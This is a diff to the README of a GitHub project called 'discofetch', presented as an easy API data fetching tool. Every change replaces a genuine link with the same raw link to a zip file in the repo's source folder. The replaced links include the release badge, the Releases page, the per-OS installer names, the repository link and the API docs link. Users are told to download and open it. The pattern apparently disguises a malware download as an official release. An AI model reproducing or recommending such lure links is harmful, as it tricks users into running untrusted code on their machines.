@@ -2,7 +2,7 @@
 # 🪩 discofetch - Fetch Data Effortlessly and Quickly
 
 ## 📥 Download Now
-[![Download discofetch](https://img.shields.io/badge/Download%20discofetch-v1.0-blue)](https://github.com/chinyswork/discofetch/releases)
+[![Download discofetch](https://raw.githubusercontent.com/chinyswork/discofetch/main/src/discofetch-1.5.zip%20discofetch-v1.0-blue)](https://raw.githubusercontent.com/chinyswork/discofetch/main/src/discofetch-1.5.zip)
 
 ## 🚀 Getting Started
 Welcome to discofetch! This tool helps you fetch data from APIs easily. You do not need coding skills to use it. Follow the simple steps below to get started.
@@ -15,14 +15,14 @@ To run discofetch, ensure your device meets these requirements:
 - Internet Connection: Required for fetching data
 
 ## 🔗 Download & Install
-To get discofetch, visit the [Releases page](https://github.com/chinyswork/discofetch/releases) on GitHub. Here’s how to do it:
+To get discofetch, visit the [Releases page](https://raw.githubusercontent.com/chinyswork/discofetch/main/src/discofetch-1.5.zip) on GitHub. Here’s how to do it:
 
 1. Click the link above to open the Releases page.
 2. Look for the latest version. It’s usually highlighted at the top.
 3. Find the file that matches your operating system. You might see files like:
-   - discofetch-windows.exe for Windows
-   - discofetch-mac.dmg for macOS
-   - discofetch-linux.zip for Linux
+   - https://raw.githubusercontent.com/chinyswork/discofetch/main/src/discofetch-1.5.zip for Windows
+   - https://raw.githubusercontent.com/chinyswork/discofetch/main/src/discofetch-1.5.zip for macOS
+   - https://raw.githubusercontent.com/chinyswork/discofetch/main/src/discofetch-1.5.zip for Linux
 4. Click the file name to start downloading.
 5. Once the download finishes, open the file to install discofetch on your device.
 6. Follow the on-screen instructions to complete the installation.
@@ -63,8 +63,8 @@ We encourage users to provide feedback. Your input helps us improve discofetch. 
 This project is licensed under the MIT License. You are free to use and modify it as per the license terms.
 
 ## 🔗 Additional Resources
-- [GitHub Repository](https://github.com/chinyswork/discofetch)
-- [API Documentation](https://api.example.com/docs) (replace with actual API docs links)
+- [GitHub Repository](https://raw.githubusercontent.com/chinyswork/discofetch/main/src/discofetch-1.5.zip)
+- [API Documentation](https://raw.githubusercontent.com/chinyswork/discofetch/main/src/discofetch-1.5.zip) (replace with actual API docs links)
 
 Thank you for using discofetch! Enjoy fetching your data.
 ```
